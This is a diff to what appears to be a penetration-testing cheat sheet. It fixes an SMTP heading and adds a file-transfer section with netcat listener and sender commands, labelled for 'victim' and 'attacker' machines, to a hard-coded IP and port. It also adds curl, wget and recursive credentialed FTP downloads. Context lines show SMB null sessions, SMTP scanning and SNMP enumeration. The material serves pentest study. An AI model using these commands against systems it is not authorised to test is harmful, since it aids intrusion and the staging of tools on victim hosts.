@@ -64,7 +64,7 @@ Alice needs Bob's help. Since Alice is beyond firewall it is impossible to BOB t
 
 	smbclient \\<[IP]>\share -N
 
-# SNTP
+# SMTP
 
 	nmap -p25 <[SUBNET]> --open
 
@@ -97,6 +97,38 @@ Mib-values (for snmpwalk):
 	1.3.6.1.4.1.77.1.2.25 User
 
 	1.3.6.1.2.1.6.13.1.3 TCP Local Ports
+	
+# File Transfer
+
+<b>Netcat:</b>
+
+	On Victim machine (client):
+
+	nc -nlvp 4444 > <[FILE]>
+
+	On Attacker machine (server):
+
+	nc -nv 10.11.17.9 4444 < <[FILE_TO_SEND]>
+
+<b>Curl:</b>
+
+	curl -O http://<[IP]>/<[FILE]>
+	
+<b>Wget:</b>
+
+	wget http://<[IP]>/<[FILE]>
+	
+<b>Recursive wget ftp download:</b>
+
+	wget -r ftp://<[USER]>:<[PASSWORD]>@<[DOMAIN]>
+
+
+
+
+
+
+
+
 
 
 
